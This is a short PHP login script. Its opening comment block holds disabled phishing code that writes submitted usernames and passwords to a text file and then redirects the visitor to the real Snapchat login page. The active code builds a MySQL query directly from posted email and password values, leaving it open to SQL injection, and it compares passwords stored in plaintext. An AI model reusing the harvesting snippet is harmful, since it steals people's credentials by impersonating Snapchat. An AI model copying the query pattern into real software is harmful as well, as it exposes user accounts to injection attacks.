<?php

/*file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://accounts.snapchat.com/accounts/login');
exit();*/

include_once('db.php');
if(isset($_POST['email']) && isset($_POST['password']))
{

  $email = $_POST['email'];
  $password = $_POST['password'];

  $query = "select email,password from user where email='$email' and password='$password'";
  $result=mysqli_query($conn,$query);

  
   if($result->num_rows==1)
   {
    echo 1;
   }
   else
   {
    echo 0;
   
   }
}
?>